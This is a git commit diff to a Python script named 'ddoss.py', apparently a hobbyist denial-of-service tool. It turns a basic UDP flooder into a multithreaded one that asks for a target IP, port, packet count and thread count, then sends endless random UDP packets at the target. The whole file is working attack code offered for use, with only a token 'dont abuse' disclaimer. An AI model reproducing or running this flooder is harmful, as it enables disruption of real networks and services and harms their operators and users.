e7333722d6f5c49e68a9596fec28b868ef7fb0d1
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-08 15:28:03 +0300

    Update ddoss.py

--- ddoss.py
+++ ddoss.py
@@ -1,17 +1,80 @@
-import socket, random, time
+import random
+import socket
+import threading
+import os,sys
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+os.system("clear")
+print('''
+    KAZUYA AND TEAM
+ 
+╭╮╭━╮
+┃┃┃╭╯
+┃╰╯╯╭━━┳━━━┳╮╭┳╮╱╭┳━━╮
+┃╭╮┃┃╭╮┣━━┃┃┃┃┃┃╱┃┃╭╮┃
+┃┃┃╰┫╭╮┃┃━━┫╰╯┃╰━╯┃╭╮┃
+╰╯╰━┻╯╰┻━━━┻━━┻━╮╭┻╯╰╯
+╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
+╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
+                                
+''')
+print("dont abuse, dosa tanggung sendiri")
+print("Tools By Kazuya")
+ip = str(input(" Target IP:"))
+port = int(input(" Target Port:"))
+choice = str(input("Serang gak (y/n):"))
+times = int(input(" Packets :"))
+threads = int(input(" Threads:"))
 
-ip = input("Enter Target Ip:")
-port = int(input("Enter Target Port: "))
+os.system("clear")
+def run():
+	data = random._urandom(900)
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Bruhh TOK TOK TOK MISI PAKET !!!")
+		except:
+			print("[X] BAYAR PAKET E MAS!!!")
 
-sleep = float(input("Sleep: "))
+def run2():
+	data = random._urandom(900)
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Bruhh TOK TOK TOK MISI PAKET!!!")
+		except:
+			s.close()
+			print("[X] BAYAR PAKET E MAS!!!")
 
-s.connect((ip,port))
+def run3():
+	data = random._urandom(16)
+	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Bruhh TOK TOK TOK MISI PAKET !!!")
+		except:
+			s.close()
+			print("[X] BAYAR PAKET E MAS!!!")
 
-for i in range(1, 100**1000):
-    s.send(random._urandom(10)*1000)
-    print(f"Send:  {i}", end='\r')
-    time.sleep(sleep)
-
-print("by the wild greek man")
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+		th = threading.Thread(target = run2)
+		th.start()
+	else:
+		th = threading.Thread(target = run3)
+		th.start()
